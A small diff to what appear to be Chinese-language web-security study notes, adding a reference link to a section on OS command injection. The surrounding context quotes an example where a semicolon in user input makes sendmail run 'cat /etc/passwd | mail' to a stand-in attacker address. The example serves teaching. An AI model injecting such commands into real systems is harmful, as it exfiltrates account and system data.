@@ -244,6 +244,7 @@ print MALL "From: info@example.com\n"
 攻击者输入值中含有"；", 这个符号在os命令中，会被解析为分隔多个执行命令的标记；
 分隔后，sendmail会执行cat /etc/passwd | mail hack@example.jp；结果含有linux账户信息的 /etc/passwd 的文件，就以邮件的形式发送给了hack@example.jp
 
+[os命令注入参考文章](https://zhuanlan.zhihu.com/p/48536948)
 
 
 4. HTTP首部注入攻击
